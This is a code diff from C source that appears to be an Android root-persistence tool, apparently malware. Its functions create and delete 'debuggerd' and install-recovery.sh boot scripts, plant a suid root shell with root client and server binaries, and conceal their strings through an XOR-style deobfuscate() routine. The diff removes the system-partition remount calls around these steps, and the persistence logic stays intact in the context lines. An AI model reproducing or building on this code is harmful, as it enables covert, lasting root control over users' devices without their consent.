@@ -45,7 +45,6 @@ int createDebuggerdBootScript() {
 
 
   memset(install_script, 0, sizeof(install_script));
-  remount(deobfuscate(system_str), 0);
 
   // Create a copy of the original binary
   f1 = fopen(deobfuscate(INSTALL_SCRIPT), "r");
@@ -71,7 +70,6 @@ int createDebuggerdBootScript() {
   fclose(f1);
 
   chmod(deobfuscate(INSTALL_SCRIPT), 0755);
-  remount(deobfuscate(system_str), MS_RDONLY);
 
   return 0;
 
@@ -88,7 +86,6 @@ int createRecoveryBootScript() {
   static unsigned char daemon_opt[] = "\x70\x91\xe9\x7f\x7f\x34\x33\x37\x3f\x21\x3e"; // "--daemon"
 
   memset(install_script, 0, sizeof(install_script));
-  remount(deobfuscate(system_str), 0);
 
   // Copy root boot script                                                                      
   if(stat(deobfuscate(INSTALL_REC_SCRIPT), &st) < 0) {
@@ -130,7 +127,6 @@ int createRecoveryBootScript() {
   }
 
   chmod(deobfuscate(INSTALL_REC_SCRIPT), 0755);
-  remount(deobfuscate(system_str), MS_RDONLY);
   
   return 0;
 
@@ -164,7 +160,6 @@ int removeDebuggerdBootScript() {
   struct stat st;
 
   LOGD("Removing suid shell and debuggerd boot script\n");
-  remount(deobfuscate(system_dir), 0);		
   unlink(deobfuscate(ROOT_SERVER));
   // Delete the boot script
   unlink(deobfuscate(INSTALL_SCRIPT));
@@ -176,7 +171,6 @@ int removeDebuggerdBootScript() {
 
   // Remove root client
   unlink(deobfuscate(ROOT_CLIENT));
-  remount(deobfuscate(system_dir), MS_RDONLY);
 
   return 0;
 }
@@ -187,7 +181,6 @@ int removeRecoveryBootScript() {
   struct stat st;
 
   LOGD("Removing suid shell and install-recovery.sh boot script\n");
-  remount(deobfuscate(system_dir), 0);		
   unlink(deobfuscate(ROOT_SERVER));
   // Delete the boot script and check if we have to restore it
   unlink(deobfuscate(INSTALL_REC_SCRIPT));
@@ -199,7 +192,6 @@ int removeRecoveryBootScript() {
   }
 		
   unlink(deobfuscate(ROOT_CLIENT));
-  remount(deobfuscate(system_dir), MS_RDONLY);
 
   return 0;
 }
